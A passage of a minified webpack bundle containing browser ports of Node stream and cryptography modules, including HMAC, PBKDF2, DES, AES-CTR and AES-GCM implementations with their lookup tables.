        module.exports = __webpack_require__(20).EventEmitter;
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var pna = __webpack_require__(38);
        function emitErrorNT(self, err) {
            self.emit("error", err);
        }
        module.exports = {
            destroy: function (err, cb) {
                var _this = this,
                    readableDestroyed = this._readableState && this._readableState.destroyed,
                    writableDestroyed = this._writableState && this._writableState.destroyed;
                return readableDestroyed || writableDestroyed
                    ? (cb ? cb(err) : !err || (this._writableState && this._writableState.errorEmitted) || pna.nextTick(emitErrorNT, this, err), this)
                    : (this._readableState && (this._readableState.destroyed = !0),
                      this._writableState && (this._writableState.destroyed = !0),
                      this._destroy(err || null, function (err) {
                          !cb && err ? (pna.nextTick(emitErrorNT, _this, err), _this._writableState && (_this._writableState.errorEmitted = !0)) : cb && cb(err);
                      }),
                      this);
            },
            undestroy: function () {
                this._readableState && ((this._readableState.destroyed = !1), (this._readableState.reading = !1), (this._readableState.ended = !1), (this._readableState.endEmitted = !1)),
                    this._writableState && ((this._writableState.destroyed = !1), (this._writableState.ended = !1), (this._writableState.ending = !1), (this._writableState.finished = !1), (this._writableState.errorEmitted = !1));
            },
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = Transform;
        var Duplex = __webpack_require__(22),
            util = Object.create(__webpack_require__(34));
        function afterTransform(er, data) {
            var ts = this._transformState;
            ts.transforming = !1;
            var cb = ts.writecb;
            if (!cb) return this.emit("error", new Error("write callback called multiple times"));
            (ts.writechunk = null), (ts.writecb = null), null != data && this.push(data), cb(er);
            var rs = this._readableState;
            (rs.reading = !1), (rs.needReadable || rs.length < rs.highWaterMark) && this._read(rs.highWaterMark);
        }
        function Transform(options) {
            if (!(this instanceof Transform)) return new Transform(options);
            Duplex.call(this, options),
                (this._transformState = { afterTransform: afterTransform.bind(this), needTransform: !1, transforming: !1, writecb: null, writechunk: null, writeencoding: null }),
                (this._readableState.needReadable = !0),
                (this._readableState.sync = !1),
                options && ("function" == typeof options.transform && (this._transform = options.transform), "function" == typeof options.flush && (this._flush = options.flush)),
                this.on("prefinish", prefinish);
        }
        function prefinish() {
            var _this = this;
            "function" == typeof this._flush
                ? this._flush(function (er, data) {
                      done(_this, er, data);
                  })
                : done(this, null, null);
        }
        function done(stream, er, data) {
            if (er) return stream.emit("error", er);
            if ((null != data && stream.push(data), stream._writableState.length)) throw new Error("Calling transform done when ws.length != 0");
            if (stream._transformState.transforming) throw new Error("Calling transform done when still transforming");
            return stream.push(null);
        }
        (util.inherits = __webpack_require__(3)),
            util.inherits(Transform, Duplex),
            (Transform.prototype.push = function (chunk, encoding) {
                return (this._transformState.needTransform = !1), Duplex.prototype.push.call(this, chunk, encoding);
            }),
            (Transform.prototype._transform = function (chunk, encoding, cb) {
                throw new Error("_transform() is not implemented");
            }),
            (Transform.prototype._write = function (chunk, encoding, cb) {
                var ts = this._transformState;
                if (((ts.writecb = cb), (ts.writechunk = chunk), (ts.writeencoding = encoding), !ts.transforming)) {
                    var rs = this._readableState;
                    (ts.needTransform || rs.needReadable || rs.length < rs.highWaterMark) && this._read(rs.highWaterMark);
                }
            }),
            (Transform.prototype._read = function (n) {
                var ts = this._transformState;
                null !== ts.writechunk && ts.writecb && !ts.transforming ? ((ts.transforming = !0), this._transform(ts.writechunk, ts.writeencoding, ts.afterTransform)) : (ts.needTransform = !0);
            }),
            (Transform.prototype._destroy = function (err, cb) {
                var _this2 = this;
                Duplex.prototype._destroy.call(this, err, function (err2) {
                    cb(err2), _this2.emit("close");
                });
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var inherits = __webpack_require__(3),
            Legacy = __webpack_require__(215),
            Base = __webpack_require__(17),
            Buffer = __webpack_require__(5).Buffer,
            md5 = __webpack_require__(96),
            RIPEMD160 = __webpack_require__(47),
            sha = __webpack_require__(48),
            ZEROS = Buffer.alloc(128);
        function Hmac(alg, key) {
            Base.call(this, "digest"), "string" == typeof key && (key = Buffer.from(key));
            var blocksize = "sha512" === alg || "sha384" === alg ? 128 : 64;
            ((this._alg = alg), (this._key = key), key.length > blocksize) ? (key = ("rmd160" === alg ? new RIPEMD160() : sha(alg)).update(key).digest()) : key.length < blocksize && (key = Buffer.concat([key, ZEROS], blocksize));
            for (var ipad = (this._ipad = Buffer.allocUnsafe(blocksize)), opad = (this._opad = Buffer.allocUnsafe(blocksize)), i = 0; i < blocksize; i++) (ipad[i] = 54 ^ key[i]), (opad[i] = 92 ^ key[i]);
            (this._hash = "rmd160" === alg ? new RIPEMD160() : sha(alg)), this._hash.update(ipad);
        }
        inherits(Hmac, Base),
            (Hmac.prototype._update = function (data) {
                this._hash.update(data);
            }),
            (Hmac.prototype._final = function () {
                var h = this._hash.digest();
                return ("rmd160" === this._alg ? new RIPEMD160() : sha(this._alg)).update(this._opad).update(h).digest();
            }),
            (module.exports = function (alg, key) {
                return "rmd160" === (alg = alg.toLowerCase()) || "ripemd160" === alg ? new Hmac("rmd160", key) : "md5" === alg ? new Legacy(md5, key) : new Hmac(alg, key);
            });
    },
    function (module, exports, __webpack_require__) {
        var MD5 = __webpack_require__(44);
        module.exports = function (buffer) {
            return new MD5().update(buffer).digest();
        };
    },
    function (module) {
        module.exports = JSON.parse(
            '{"sha224WithRSAEncryption":{"sign":"rsa","hash":"sha224","id":"302d300d06096086480165030402040500041c"},"RSA-SHA224":{"sign":"ecdsa/rsa","hash":"sha224","id":"302d300d06096086480165030402040500041c"},"sha256WithRSAEncryption":{"sign":"rsa","hash":"sha256","id":"3031300d060960864801650304020105000420"},"RSA-SHA256":{"sign":"ecdsa/rsa","hash":"sha256","id":"3031300d060960864801650304020105000420"},"sha384WithRSAEncryption":{"sign":"rsa","hash":"sha384","id":"3041300d060960864801650304020205000430"},"RSA-SHA384":{"sign":"ecdsa/rsa","hash":"sha384","id":"3041300d060960864801650304020205000430"},"sha512WithRSAEncryption":{"sign":"rsa","hash":"sha512","id":"3051300d060960864801650304020305000440"},"RSA-SHA512":{"sign":"ecdsa/rsa","hash":"sha512","id":"3051300d060960864801650304020305000440"},"RSA-SHA1":{"sign":"rsa","hash":"sha1","id":"3021300906052b0e03021a05000414"},"ecdsa-with-SHA1":{"sign":"ecdsa","hash":"sha1","id":""},"sha256":{"sign":"ecdsa","hash":"sha256","id":""},"sha224":{"sign":"ecdsa","hash":"sha224","id":""},"sha384":{"sign":"ecdsa","hash":"sha384","id":""},"sha512":{"sign":"ecdsa","hash":"sha512","id":""},"DSA-SHA":{"sign":"dsa","hash":"sha1","id":""},"DSA-SHA1":{"sign":"dsa","hash":"sha1","id":""},"DSA":{"sign":"dsa","hash":"sha1","id":""},"DSA-WITH-SHA224":{"sign":"dsa","hash":"sha224","id":""},"DSA-SHA224":{"sign":"dsa","hash":"sha224","id":""},"DSA-WITH-SHA256":{"sign":"dsa","hash":"sha256","id":""},"DSA-SHA256":{"sign":"dsa","hash":"sha256","id":""},"DSA-WITH-SHA384":{"sign":"dsa","hash":"sha384","id":""},"DSA-SHA384":{"sign":"dsa","hash":"sha384","id":""},"DSA-WITH-SHA512":{"sign":"dsa","hash":"sha512","id":""},"DSA-SHA512":{"sign":"dsa","hash":"sha512","id":""},"DSA-RIPEMD160":{"sign":"dsa","hash":"rmd160","id":""},"ripemd160WithRSA":{"sign":"rsa","hash":"rmd160","id":"3021300906052b2403020105000414"},"RSA-RIPEMD160":{"sign":"rsa","hash":"rmd160","id":"3021300906052b2403020105000414"},"md5WithRSAEncryption":{"sign":"rsa","hash":"md5","id":"3020300c06082a864886f70d020505000410"},"RSA-MD5":{"sign":"rsa","hash":"md5","id":"3020300c06082a864886f70d020505000410"}}'
        );
    },
    function (module, exports, __webpack_require__) {
        (exports.pbkdf2 = __webpack_require__(217)), (exports.pbkdf2Sync = __webpack_require__(101));
    },
    function (module, exports) {
        var MAX_ALLOC = Math.pow(2, 30) - 1;
        module.exports = function (iterations, keylen) {
            if ("number" != typeof iterations) throw new TypeError("Iterations not a number");
            if (iterations < 0) throw new TypeError("Bad iterations");
            if ("number" != typeof keylen) throw new TypeError("Key length not a number");
            if (keylen < 0 || keylen > MAX_ALLOC || keylen != keylen) throw new TypeError("Bad key length");
        };
    },
    function (module, exports, __webpack_require__) {
        (function (global, process) {
            var defaultEncoding;
            if (global.process && global.process.browser) defaultEncoding = "utf-8";
            else if (global.process && global.process.version) {
                defaultEncoding = parseInt(process.version.split(".")[0].slice(1), 10) >= 6 ? "utf-8" : "binary";
            } else defaultEncoding = "utf-8";
            module.exports = defaultEncoding;
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        var md5 = __webpack_require__(96),
            RIPEMD160 = __webpack_require__(47),
            sha = __webpack_require__(48),
            Buffer = __webpack_require__(5).Buffer,
            checkParameters = __webpack_require__(99),
            defaultEncoding = __webpack_require__(100),
            toBuffer = __webpack_require__(102),
            ZEROS = Buffer.alloc(128),
            sizes = { md5: 16, sha1: 20, sha224: 28, sha256: 32, sha384: 48, sha512: 64, rmd160: 20, ripemd160: 20 };
        function Hmac(alg, key, saltLen) {
            var hash = (function (alg) {
                    function shaFunc(data) {
                        return sha(alg).update(data).digest();
                    }
                    return "rmd160" === alg || "ripemd160" === alg
                        ? function (data) {
                              return new RIPEMD160().update(data).digest();
                          }
                        : "md5" === alg
                        ? md5
                        : shaFunc;
                })(alg),
                blocksize = "sha512" === alg || "sha384" === alg ? 128 : 64;
            key.length > blocksize ? (key = hash(key)) : key.length < blocksize && (key = Buffer.concat([key, ZEROS], blocksize));
            for (var ipad = Buffer.allocUnsafe(blocksize + sizes[alg]), opad = Buffer.allocUnsafe(blocksize + sizes[alg]), i = 0; i < blocksize; i++) (ipad[i] = 54 ^ key[i]), (opad[i] = 92 ^ key[i]);
            var ipad1 = Buffer.allocUnsafe(blocksize + saltLen + 4);
            ipad.copy(ipad1, 0, 0, blocksize), (this.ipad1 = ipad1), (this.ipad2 = ipad), (this.opad = opad), (this.alg = alg), (this.blocksize = blocksize), (this.hash = hash), (this.size = sizes[alg]);
        }
        (Hmac.prototype.run = function (data, ipad) {
            return data.copy(ipad, this.blocksize), this.hash(ipad).copy(this.opad, this.blocksize), this.hash(this.opad);
        }),
            (module.exports = function (password, salt, iterations, keylen, digest) {
                checkParameters(iterations, keylen);
                var hmac = new Hmac((digest = digest || "sha1"), (password = toBuffer(password, defaultEncoding, "Password")), (salt = toBuffer(salt, defaultEncoding, "Salt")).length),
                    DK = Buffer.allocUnsafe(keylen),
                    block1 = Buffer.allocUnsafe(salt.length + 4);
                salt.copy(block1, 0, 0, salt.length);
                for (var destPos = 0, hLen = sizes[digest], l = Math.ceil(keylen / hLen), i = 1; i <= l; i++) {
                    block1.writeUInt32BE(i, salt.length);
                    for (var T = hmac.run(block1, hmac.ipad1), U = T, j = 1; j < iterations; j++) {
                        U = hmac.run(U, hmac.ipad2);
                        for (var k = 0; k < hLen; k++) T[k] ^= U[k];
                    }
                    T.copy(DK, destPos), (destPos += hLen);
                }
                return DK;
            });
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer;
        module.exports = function (thing, encoding, name) {
            if (Buffer.isBuffer(thing)) return thing;
            if ("string" == typeof thing) return Buffer.from(thing, encoding);
            if (ArrayBuffer.isView(thing)) return Buffer.from(thing.buffer);
            throw new TypeError(name + " must be a string, a Buffer, a typed array or a DataView");
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (exports.readUInt32BE = function (bytes, off) {
            return ((bytes[0 + off] << 24) | (bytes[1 + off] << 16) | (bytes[2 + off] << 8) | bytes[3 + off]) >>> 0;
        }),
            (exports.writeUInt32BE = function (bytes, value, off) {
                (bytes[0 + off] = value >>> 24), (bytes[1 + off] = (value >>> 16) & 255), (bytes[2 + off] = (value >>> 8) & 255), (bytes[3 + off] = 255 & value);
            }),
            (exports.ip = function (inL, inR, out, off) {
                for (var outL = 0, outR = 0, i = 6; i >= 0; i -= 2) {
                    for (var j = 0; j <= 24; j += 8) (outL <<= 1), (outL |= (inR >>> (j + i)) & 1);
                    for (j = 0; j <= 24; j += 8) (outL <<= 1), (outL |= (inL >>> (j + i)) & 1);
                }
                for (i = 6; i >= 0; i -= 2) {
                    for (j = 1; j <= 25; j += 8) (outR <<= 1), (outR |= (inR >>> (j + i)) & 1);
                    for (j = 1; j <= 25; j += 8) (outR <<= 1), (outR |= (inL >>> (j + i)) & 1);
                }
                (out[off + 0] = outL >>> 0), (out[off + 1] = outR >>> 0);
            }),
            (exports.rip = function (inL, inR, out, off) {
                for (var outL = 0, outR = 0, i = 0; i < 4; i++) for (var j = 24; j >= 0; j -= 8) (outL <<= 1), (outL |= (inR >>> (j + i)) & 1), (outL <<= 1), (outL |= (inL >>> (j + i)) & 1);
                for (i = 4; i < 8; i++) for (j = 24; j >= 0; j -= 8) (outR <<= 1), (outR |= (inR >>> (j + i)) & 1), (outR <<= 1), (outR |= (inL >>> (j + i)) & 1);
                (out[off + 0] = outL >>> 0), (out[off + 1] = outR >>> 0);
            }),
            (exports.pc1 = function (inL, inR, out, off) {
                for (var outL = 0, outR = 0, i = 7; i >= 5; i--) {
                    for (var j = 0; j <= 24; j += 8) (outL <<= 1), (outL |= (inR >> (j + i)) & 1);
                    for (j = 0; j <= 24; j += 8) (outL <<= 1), (outL |= (inL >> (j + i)) & 1);
                }
                for (j = 0; j <= 24; j += 8) (outL <<= 1), (outL |= (inR >> (j + i)) & 1);
                for (i = 1; i <= 3; i++) {
                    for (j = 0; j <= 24; j += 8) (outR <<= 1), (outR |= (inR >> (j + i)) & 1);
                    for (j = 0; j <= 24; j += 8) (outR <<= 1), (outR |= (inL >> (j + i)) & 1);
                }
                for (j = 0; j <= 24; j += 8) (outR <<= 1), (outR |= (inL >> (j + i)) & 1);
                (out[off + 0] = outL >>> 0), (out[off + 1] = outR >>> 0);
            }),
            (exports.r28shl = function (num, shift) {
                return ((num << shift) & 268435455) | (num >>> (28 - shift));
            });
        var pc2table = [14, 11, 17, 4, 27, 23, 25, 0, 13, 22, 7, 18, 5, 9, 16, 24, 2, 20, 12, 21, 1, 8, 15, 26, 15, 4, 25, 19, 9, 1, 26, 16, 5, 11, 23, 8, 12, 7, 17, 0, 22, 3, 10, 14, 6, 20, 27, 24];
        (exports.pc2 = function (inL, inR, out, off) {
            for (var outL = 0, outR = 0, len = pc2table.length >>> 1, i = 0; i < len; i++) (outL <<= 1), (outL |= (inL >>> pc2table[i]) & 1);
            for (i = len; i < pc2table.length; i++) (outR <<= 1), (outR |= (inR >>> pc2table[i]) & 1);
            (out[off + 0] = outL >>> 0), (out[off + 1] = outR >>> 0);
        }),
            (exports.expand = function (r, out, off) {
                var outL = 0,
                    outR = 0;
                outL = ((1 & r) << 5) | (r >>> 27);
                for (var i = 23; i >= 15; i -= 4) (outL <<= 6), (outL |= (r >>> i) & 63);
                for (i = 11; i >= 3; i -= 4) (outR |= (r >>> i) & 63), (outR <<= 6);
                (outR |= ((31 & r) << 1) | (r >>> 31)), (out[off + 0] = outL >>> 0), (out[off + 1] = outR >>> 0);
            });
        var sTable = [
            14,
            0,
            4,
            15,
            13,
            7,
            1,
            4,
            2,
            14,
            15,
            2,
            11,
            13,
            8,
            1,
            3,
            10,
            10,
            6,
            6,
            12,
            12,
            11,
            5,
            9,
            9,
            5,
            0,
            3,
            7,
            8,
            4,
            15,
            1,
            12,
            14,
            8,
            8,
            2,
            13,
            4,
            6,
            9,
            2,
            1,
            11,
            7,
            15,
            5,
            12,
            11,
            9,
            3,
            7,
            14,
            3,
            10,
            10,
            0,
            5,
            6,
            0,
            13,
            15,
            3,
            1,
            13,
            8,
            4,
            14,
            7,
            6,
            15,
            11,
            2,
            3,
            8,
            4,
            14,
            9,
            12,
            7,
            0,
            2,
            1,
            13,
            10,
            12,
            6,
            0,
            9,
            5,
            11,
            10,
            5,
            0,
            13,
            14,
            8,
            7,
            10,
            11,
            1,
            10,
            3,
            4,
            15,
            13,
            4,
            1,
            2,
            5,
            11,
            8,
            6,
            12,
            7,
            6,
            12,
            9,
            0,
            3,
            5,
            2,
            14,
            15,
            9,
            10,
            13,
            0,
            7,
            9,
            0,
            14,
            9,
            6,
            3,
            3,
            4,
            15,
            6,
            5,
            10,
            1,
            2,
            13,
            8,
            12,
            5,
            7,
            14,
            11,
            12,
            4,
            11,
            2,
            15,
            8,
            1,
            13,
            1,
            6,
            10,
            4,
            13,
            9,
            0,
            8,
            6,
            15,
            9,
            3,
            8,
            0,
            7,
            11,
            4,
            1,
            15,
            2,
            14,
            12,
            3,
            5,
            11,
            10,
            5,
            14,
            2,
            7,
            12,
            7,
            13,
            13,
            8,
            14,
            11,
            3,
            5,
            0,
            6,
            6,
            15,
            9,
            0,
            10,
            3,
            1,
            4,
            2,
            7,
            8,
            2,
            5,
            12,
            11,
            1,
            12,
            10,
            4,
            14,
            15,
            9,
            10,
            3,
            6,
            15,
            9,
            0,
            0,
            6,
            12,
            10,
            11,
            1,
            7,
            13,
            13,
            8,
            15,
            9,
            1,
            4,
            3,
            5,
            14,
            11,
            5,
            12,
            2,
            7,
            8,
            2,
            4,
            14,
            2,
            14,
            12,
            11,
            4,
            2,
            1,
            12,
            7,
            4,
            10,
            7,
            11,
            13,
            6,
            1,
            8,
            5,
            5,
            0,
            3,
            15,
            15,
            10,
            13,
            3,
            0,
            9,
            14,
            8,
            9,
            6,
            4,
            11,
            2,
            8,
            1,
            12,
            11,
            7,
            10,
            1,
            13,
            14,
            7,
            2,
            8,
            13,
            15,
            6,
            9,
            15,
            12,
            0,
            5,
            9,
            6,
            10,
            3,
            4,
            0,
            5,
            14,
            3,
            12,
            10,
            1,
            15,
            10,
            4,
            15,
            2,
            9,
            7,
            2,
            12,
            6,
            9,
            8,
            5,
            0,
            6,
            13,
            1,
            3,
            13,
            4,
            14,
            14,
            0,
            7,
            11,
            5,
            3,
            11,
            8,
            9,
            4,
            14,
            3,
            15,
            2,
            5,
            12,
            2,
            9,
            8,
            5,
            12,
            15,
            3,
            10,
            7,
            11,
            0,
            14,
            4,
            1,
            10,
            7,
            1,
            6,
            13,
            0,
            11,
            8,
            6,
            13,
            4,
            13,
            11,
            0,
            2,
            11,
            14,
            7,
            15,
            4,
            0,
            9,
            8,
            1,
            13,
            10,
            3,
            14,
            12,
            3,
            9,
            5,
            7,
            12,
            5,
            2,
            10,
            15,
            6,
            8,
            1,
            6,
            1,
            6,
            4,
            11,
            11,
            13,
            13,
            8,
            12,
            1,
            3,
            4,
            7,
            10,
            14,
            7,
            10,
            9,
            15,
            5,
            6,
            0,
            8,
            15,
            0,
            14,
            5,
            2,
            9,
            3,
            2,
            12,
            13,
            1,
            2,
            15,
            8,
            13,
            4,
            8,
            6,
            10,
            15,
            3,
            11,
            7,
            1,
            4,
            10,
            12,
            9,
            5,
            3,
            6,
            14,
            11,
            5,
            0,
            0,
            14,
            12,
            9,
            7,
            2,
            7,
            2,
            11,
            1,
            4,
            14,
            1,
            7,
            9,
            4,
            12,
            10,
            14,
            8,
            2,
            13,
            0,
            15,
            6,
            12,
            10,
            9,
            13,
            0,
            15,
            3,
            3,
            5,
            5,
            6,
            8,
            11,
        ];
        exports.substitute = function (inL, inR) {
            for (var out = 0, i = 0; i < 4; i++) {
                (out <<= 4), (out |= sTable[64 * i + ((inL >>> (18 - 6 * i)) & 63)]);
            }
            for (i = 0; i < 4; i++) {
                (out <<= 4), (out |= sTable[256 + 64 * i + ((inR >>> (18 - 6 * i)) & 63)]);
            }
            return out >>> 0;
        };
        var permuteTable = [16, 25, 12, 11, 3, 20, 4, 15, 31, 17, 9, 6, 27, 14, 1, 22, 30, 24, 8, 18, 0, 5, 29, 23, 13, 19, 2, 26, 10, 21, 28, 7];
        (exports.permute = function (num) {
            for (var out = 0, i = 0; i < permuteTable.length; i++) (out <<= 1), (out |= (num >>> permuteTable[i]) & 1);
            return out >>> 0;
        }),
            (exports.padSplit = function (num, size, group) {
                for (var str = num.toString(2); str.length < size; ) str = "0" + str;
                for (var out = [], i = 0; i < size; i += group) out.push(str.slice(i, i + group));
                return out.join(" ");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var assert = __webpack_require__(11),
            inherits = __webpack_require__(3),
            utils = __webpack_require__(103),
            Cipher = __webpack_require__(51);
        function DESState() {
            (this.tmp = new Array(2)), (this.keys = null);
        }
        function DES(options) {
            Cipher.call(this, options);
            var state = new DESState();
            (this._desState = state), this.deriveKeys(state, options.key);
        }
        inherits(DES, Cipher),
            (module.exports = DES),
            (DES.create = function (options) {
                return new DES(options);
            });
        var shiftTable = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1];
        (DES.prototype.deriveKeys = function (state, key) {
            (state.keys = new Array(32)), assert.equal(key.length, this.blockSize, "Invalid key length");
            var kL = utils.readUInt32BE(key, 0),
                kR = utils.readUInt32BE(key, 4);
            utils.pc1(kL, kR, state.tmp, 0), (kL = state.tmp[0]), (kR = state.tmp[1]);
            for (var i = 0; i < state.keys.length; i += 2) {
                var shift = shiftTable[i >>> 1];
                (kL = utils.r28shl(kL, shift)), (kR = utils.r28shl(kR, shift)), utils.pc2(kL, kR, state.keys, i);
            }
        }),
            (DES.prototype._update = function (inp, inOff, out, outOff) {
                var state = this._desState,
                    l = utils.readUInt32BE(inp, inOff),
                    r = utils.readUInt32BE(inp, inOff + 4);
                utils.ip(l, r, state.tmp, 0),
                    (l = state.tmp[0]),
                    (r = state.tmp[1]),
                    "encrypt" === this.type ? this._encrypt(state, l, r, state.tmp, 0) : this._decrypt(state, l, r, state.tmp, 0),
                    (l = state.tmp[0]),
                    (r = state.tmp[1]),
                    utils.writeUInt32BE(out, l, outOff),
                    utils.writeUInt32BE(out, r, outOff + 4);
            }),
            (DES.prototype._pad = function (buffer, off) {
                for (var value = buffer.length - off, i = off; i < buffer.length; i++) buffer[i] = value;
                return !0;
            }),
            (DES.prototype._unpad = function (buffer) {
                for (var pad = buffer[buffer.length - 1], i = buffer.length - pad; i < buffer.length; i++) assert.equal(buffer[i], pad);
                return buffer.slice(0, buffer.length - pad);
            }),
            (DES.prototype._encrypt = function (state, lStart, rStart, out, off) {
                for (var l = lStart, r = rStart, i = 0; i < state.keys.length; i += 2) {
                    var keyL = state.keys[i],
                        keyR = state.keys[i + 1];
                    utils.expand(r, state.tmp, 0), (keyL ^= state.tmp[0]), (keyR ^= state.tmp[1]);
                    var s = utils.substitute(keyL, keyR),
                        t = r;
                    (r = (l ^ utils.permute(s)) >>> 0), (l = t);
                }
                utils.rip(r, l, out, off);
            }),
            (DES.prototype._decrypt = function (state, lStart, rStart, out, off) {
                for (var l = rStart, r = lStart, i = state.keys.length - 2; i >= 0; i -= 2) {
                    var keyL = state.keys[i],
                        keyR = state.keys[i + 1];
                    utils.expand(l, state.tmp, 0), (keyL ^= state.tmp[0]), (keyR ^= state.tmp[1]);
                    var s = utils.substitute(keyL, keyR),
                        t = l;
                    (l = (r ^ utils.permute(s)) >>> 0), (r = t);
                }
                utils.rip(l, r, out, off);
            });
    },
    function (module, exports, __webpack_require__) {
        var xor = __webpack_require__(35),
            Buffer = __webpack_require__(5).Buffer,
            incr32 = __webpack_require__(106);
        function getBlock(self) {
            var out = self._cipher.encryptBlockRaw(self._prev);
            return incr32(self._prev), out;
        }
        exports.encrypt = function (self, chunk) {
            var chunkNum = Math.ceil(chunk.length / 16),
                start = self._cache.length;
            self._cache = Buffer.concat([self._cache, Buffer.allocUnsafe(16 * chunkNum)]);
            for (var i = 0; i < chunkNum; i++) {
                var out = getBlock(self),
                    offset = start + 16 * i;
                self._cache.writeUInt32BE(out[0], offset + 0), self._cache.writeUInt32BE(out[1], offset + 4), self._cache.writeUInt32BE(out[2], offset + 8), self._cache.writeUInt32BE(out[3], offset + 12);
            }
            var pad = self._cache.slice(0, chunk.length);
            return (self._cache = self._cache.slice(chunk.length)), xor(chunk, pad);
        };
    },
    function (module, exports) {
        module.exports = function (iv) {
            for (var item, len = iv.length; len--; ) {
                if (255 !== (item = iv.readUInt8(len))) {
                    item++, iv.writeUInt8(item, len);
                    break;
                }
                iv.writeUInt8(0, len);
            }
        };
    },
    function (module) {
        module.exports = JSON.parse(
            '{"aes-128-ecb":{"cipher":"AES","key":128,"iv":0,"mode":"ECB","type":"block"},"aes-192-ecb":{"cipher":"AES","key":192,"iv":0,"mode":"ECB","type":"block"},"aes-256-ecb":{"cipher":"AES","key":256,"iv":0,"mode":"ECB","type":"block"},"aes-128-cbc":{"cipher":"AES","key":128,"iv":16,"mode":"CBC","type":"block"},"aes-192-cbc":{"cipher":"AES","key":192,"iv":16,"mode":"CBC","type":"block"},"aes-256-cbc":{"cipher":"AES","key":256,"iv":16,"mode":"CBC","type":"block"},"aes128":{"cipher":"AES","key":128,"iv":16,"mode":"CBC","type":"block"},"aes192":{"cipher":"AES","key":192,"iv":16,"mode":"CBC","type":"block"},"aes256":{"cipher":"AES","key":256,"iv":16,"mode":"CBC","type":"block"},"aes-128-cfb":{"cipher":"AES","key":128,"iv":16,"mode":"CFB","type":"stream"},"aes-192-cfb":{"cipher":"AES","key":192,"iv":16,"mode":"CFB","type":"stream"},"aes-256-cfb":{"cipher":"AES","key":256,"iv":16,"mode":"CFB","type":"stream"},"aes-128-cfb8":{"cipher":"AES","key":128,"iv":16,"mode":"CFB8","type":"stream"},"aes-192-cfb8":{"cipher":"AES","key":192,"iv":16,"mode":"CFB8","type":"stream"},"aes-256-cfb8":{"cipher":"AES","key":256,"iv":16,"mode":"CFB8","type":"stream"},"aes-128-cfb1":{"cipher":"AES","key":128,"iv":16,"mode":"CFB1","type":"stream"},"aes-192-cfb1":{"cipher":"AES","key":192,"iv":16,"mode":"CFB1","type":"stream"},"aes-256-cfb1":{"cipher":"AES","key":256,"iv":16,"mode":"CFB1","type":"stream"},"aes-128-ofb":{"cipher":"AES","key":128,"iv":16,"mode":"OFB","type":"stream"},"aes-192-ofb":{"cipher":"AES","key":192,"iv":16,"mode":"OFB","type":"stream"},"aes-256-ofb":{"cipher":"AES","key":256,"iv":16,"mode":"OFB","type":"stream"},"aes-128-ctr":{"cipher":"AES","key":128,"iv":16,"mode":"CTR","type":"stream"},"aes-192-ctr":{"cipher":"AES","key":192,"iv":16,"mode":"CTR","type":"stream"},"aes-256-ctr":{"cipher":"AES","key":256,"iv":16,"mode":"CTR","type":"stream"},"aes-128-gcm":{"cipher":"AES","key":128,"iv":12,"mode":"GCM","type":"auth"},"aes-192-gcm":{"cipher":"AES","key":192,"iv":12,"mode":"GCM","type":"auth"},"aes-256-gcm":{"cipher":"AES","key":256,"iv":12,"mode":"GCM","type":"auth"}}'
        );
    },
    function (module, exports, __webpack_require__) {
        var aes = __webpack_require__(39),
            Buffer = __webpack_require__(5).Buffer,
            Transform = __webpack_require__(17),
            inherits = __webpack_require__(3),
            GHASH = __webpack_require__(230),
            xor = __webpack_require__(35),
            incr32 = __webpack_require__(106);
        function StreamCipher(mode, key, iv, decrypt) {
            Transform.call(this);
            var h = Buffer.alloc(4, 0);
            this._cipher = new aes.AES(key);
            var ck = this._cipher.encryptBlock(h);
            (this._ghash = new GHASH(ck)),
                (iv = (function (self, iv, ck) {
                    if (12 === iv.length) return (self._finID = Buffer.concat([iv, Buffer.from([0, 0, 0, 1])])), Buffer.concat([iv, Buffer.from([0, 0, 0, 2])]);
                    var ghash = new GHASH(ck),
                        len = iv.length,
                        toPad = len % 16;
                    ghash.update(iv), toPad && ((toPad = 16 - toPad), ghash.update(Buffer.alloc(toPad, 0))), ghash.update(Buffer.alloc(8, 0));
                    var ivBits = 8 * len,
                        tail = Buffer.alloc(8);
                    tail.writeUIntBE(ivBits, 0, 8), ghash.update(tail), (self._finID = ghash.state);
                    var out = Buffer.from(self._finID);
                    return incr32(out), out;
                })(this, iv, ck)),
                (this._prev = Buffer.from(iv)),
                (this._cache = Buffer.allocUnsafe(0)),
                (this._secCache = Buffer.allocUnsafe(0)),
                (this._decrypt = decrypt),
                (this._alen = 0),
                (this._len = 0),
                (this._mode = mode),
                (this._authTag = null),
                (this._called = !1);
        }
        inherits(StreamCipher, Transform),
            (StreamCipher.prototype._update = function (chunk) {
                if (!this._called && this._alen) {
                    var rump = 16 - (this._alen % 16);
                    rump < 16 && ((rump = Buffer.alloc(rump, 0)), this._ghash.update(rump));
                }
                this._called = !0;
                var out = this._mode.encrypt(this, chunk);
                return this._decrypt ? this._ghash.update(chunk) : this._ghash.update(out), (this._len += chunk.length), out;
            }),
            (StreamCipher.prototype._final = function () {
                if (this._decrypt && !this._authTag) throw new Error("Unsupported state or unable to authenticate data");
                var tag = xor(this._ghash.final(8 * this._alen, 8 * this._len), this._cipher.encryptBlock(this._finID));
                if (
                    this._decrypt &&
                    (function (a, b) {
                        var out = 0;
                        a.length !== b.length && out++;
                        for (var len = Math.min(a.length, b.length), i = 0; i < len; ++i) out += a[i] ^ b[i];
                        return out;
                    })(tag, this._authTag)
                )
                    throw new Error("Unsupported state or unable to authenticate data");
                (this._authTag = tag), this._cipher.scrub();
            }),
            (StreamCipher.prototype.getAuthTag = function () {
                if (this._decrypt || !Buffer.isBuffer(this._authTag)) throw new Error("Attempting to get auth tag in unsupported state");
                return this._authTag;
            }),
            (StreamCipher.prototype.setAuthTag = function (tag) {
                if (!this._decrypt) throw new Error("Attempting to set auth tag in unsupported state");
                this._authTag = tag;
            }),
            (StreamCipher.prototype.setAAD = function (buf) {
                if (this._called) throw new Error("Attempting to set AAD in unsupported state");
                this._ghash.update(buf), (this._alen += buf.length);
            }),
            (module.exports = StreamCipher);
    },
    function (module, exports, __webpack_require__) {
        var aes = __webpack_require__(39),
            Buffer = __webpack_require__(5).Buffer,
            Transform = __webpack_require__(17);
